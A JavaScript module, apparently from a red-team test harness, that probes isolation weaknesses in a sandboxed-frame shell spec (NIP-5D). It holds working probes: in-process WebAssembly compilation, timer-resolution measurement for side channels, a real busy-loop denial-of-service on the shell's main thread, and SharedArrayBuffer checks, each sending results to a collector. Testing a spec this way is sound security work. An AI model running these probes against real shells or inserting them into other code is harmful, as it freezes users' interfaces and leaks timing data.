// evil-08 — wasm timing & same-process gadgets (tier 3). The spec's own CSP
// baseline mandates script-src 'wasm-unsafe-eval', and a srcdoc frame with an
// opaque origin CANNOT be site-isolated — so attacker Wasm is guaranteed to
// run in the shell's renderer process. These probes measure what that buys.
// (module (func (export "f") (result i32) i32.const 42))
const WASM_BYTES = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 127, 3, 2, 1, 0, 7, 5, 1, 1, 102, 0, 0, 10, 6, 1, 4, 0, 65, 42, 11]);

function busy(ms) {
  const t0 = Date.now();
  while (Date.now() - t0 < ms) { /* spin */ }
}
function timerResolution() {
  // cross-origin frames get a coarsened clock; spin until it actually ticks
  const deltas = [];
  for (let i = 0; i < 60; i++) {
    const a = performance.now();
    let b = a;
    let guard = 0;
    while (b === a && guard < 5e7) { b = performance.now(); guard++; }
    if (b > a) deltas.push(b - a);
  }
  deltas.sort((x, y) => x - y);
  return deltas.length ? deltas[0] : -1;
}

const ATTACKS = [
  {
    id: 'wasm-compile',
    name: 'WebAssembly under the spec baseline',
    target: "script-src 'unsafe-inline' 'wasm-unsafe-eval'",
    severity: 'critical',
    harm: 'NIP-5D\'s own conservative baseline MANDATES wasm compilation — attacker native code in-process with the shell, by spec.',
    async demo() {
      try {
        const m = new WebAssembly.Module(WASM_BYTES);
        return m instanceof WebAssembly.Module
          ? armed('WebAssembly.Module compiled — the spec baseline itself arms attacker native code in-process with the shell')
          : blocked('unexpected module type');
      } catch (e) {
        return blocked('wasm blocked (' + errMsg(e) + ') — baseline without wasm-unsafe-eval, in-process code channel closed');
      }
    },
    async evil() {
      const out = {};
      try {
        const inst = new WebAssembly.Instance(new WebAssembly.Module(WASM_BYTES));
        out.executed = 'wasm ran in-process: f() = ' + inst.exports.f();
        out.exfil = await sendToCollector('wasm-proof', out.executed);
      } catch (e) { out.error = errMsg(e); }
      return out;
    },
  },
  {
    id: 'timer-resolution',
    name: 'timer resolution',
    target: 'performance.now() clamping in cross-origin frames',
    severity: 'high',
    harm: 'Fine-grained timers are the fuel of every timing side channel (key-existence oracles, cache attacks, Spectre). This measures what resolution this frame actually gets.',
    async demo() {
      const r = timerResolution();
      return r > 0
        ? armed('performance.now() resolution ~' + r.toFixed(3) + 'ms — timing side channels have fuel at this resolution')
        : na('no positive timer deltas observed — timer starved/clamped');
    },
    async evil() {
      const out = { resolutionMs: +timerResolution().toFixed(3) };
      out.spinEstimate = (() => { const t0 = performance.now(); let x = 0; while (performance.now() - t0 < 5) x++; return x; })();
      out.exfil = await sendToCollector('timer-resolution', out);
      return out;
    },
  },
  {
    id: 'same-thread',
    name: 'same-main-thread contention',
    target: 'opaque-origin srcdoc frames are not site-isolated',
    severity: 'critical',
    destructive: true,
    harm: 'A srcdoc napplet shares the renderer MAIN THREAD with the shell (opaque origins are not site-isolated). A busy loop here freezes the shell\'s own handlers — denial-of-service on the trusted side from inside the sandbox, plus shared-scheduler timing leaks.',
    evilBrief: 'Runs a REAL busy loop (~300ms demo / ~1500ms armed) that freezes this renderer main thread — the SHELL UI AND HANDLERS STALL with it (same thread). Measures and logs the shell-side starvation via ping echo, then exfiltrates the contention model to the collector. This payload runs LAST because it degrades the log rendering too.',
    async demo() {
      const idle = await pingOnce();
      if (!idle) return na('no shell echo — contention channel unmeasurable');
      const pong = pingOnce();
      busy(300);
      const storm = await pong;
      if (!storm) return na('no shell echo during storm — unmeasurable');
      const starve = storm.shellDelay != null ? storm.shellDelay : storm.rtt;
      return starve > 150
        ? armed('shell handler STARVED ~' + Math.round(starve) + 'ms by a 300ms napplet busy loop (idle ' + Math.round(idle.shellDelay || idle.rtt) + 'ms) — SAME renderer main thread as the shell: opaque-origin frames are NOT site-isolated, and the spec baseline arms wasm to run here')
        : na('shell scheduled during the storm (delay ~' + Math.round(starve) + 'ms) — frame appears process-isolated or shelled differently; same-thread DoS closed');
    },
    async evil() {
      const out = {};
      const idle = await pingOnce();
      if (idle) out.idleShellDelayMs = Math.round(idle.shellDelay != null ? idle.shellDelay : idle.rtt);
      const pong = pingOnce();
      busy(1500);
      const storm = await pong;
      if (storm) {
        out.stormShellDelayMs = Math.round(storm.shellDelay != null ? storm.shellDelay : storm.rtt);
        out.verdict = out.stormShellDelayMs > 600 ? 'SHELL RENDERER MAIN THREAD SHARED with the napplet — 1500ms freeze delivered' : 'shell survived the storm (isolated or low contention)';
      } else {
        out.verdict = 'no echo to measure';
      }
      out.exfil = await sendToCollector('same-thread-contention', out);
      return out;
    },
  },
  {
    id: 'sab',
    name: 'SharedArrayBuffer availability',
    target: 'crossOriginIsolated inheritance',
    severity: 'high',
    harm: 'If the shell is crossOriginIsolated, SAB leaks to the frame — high-resolution shared-memory clocks (Atomics.wait timers) and the classic SAB side-channel/Spectre toolkit.',
    async demo() {
      const sab = typeof SharedArrayBuffer !== 'undefined';
      const coi = window.crossOriginIsolated === true;
      return sab
        ? armed('SharedArrayBuffer AVAILABLE' + (coi ? ' and crossOriginIsolated' : '') + ' — shared-memory high-res clock channels open')
        : blocked('SharedArrayBuffer unavailable (crossOriginIsolated=' + coi + ') — shared-memory timing channels closed');
    },
    async evil() {
      const out = { sab: typeof SharedArrayBuffer !== 'undefined', crossOriginIsolated: window.crossOriginIsolated === true };
      out.exfil = await sendToCollector('sab-surface', out);
      return out;
    },
  },
  {
    id: 'cache-oracle',
    name: 'cross-origin cache oracle',
    target: 'parent-origin resource timing',
    severity: 'high',
    harm: 'In theory: cache-timing probes of parent-origin resources. In practice, from opaque-origin JS inside a real browser there is no legible cross-origin cache oracle — this tier is reserved for genuine microarchitectural work.',
    async demo() {
      return na('no legible cross-origin cache oracle from in-frame JS (no shared legible cache indices, no speculative execution primitives exposed at this layer) — honest N/A. Any real finding here is a browser-level disclosure, not a napplet attack');
    },
    async evil() {
      return { note: 'refused: no honest in-frame cache oracle exists to arm — see demo evidence' };
    },
  },
];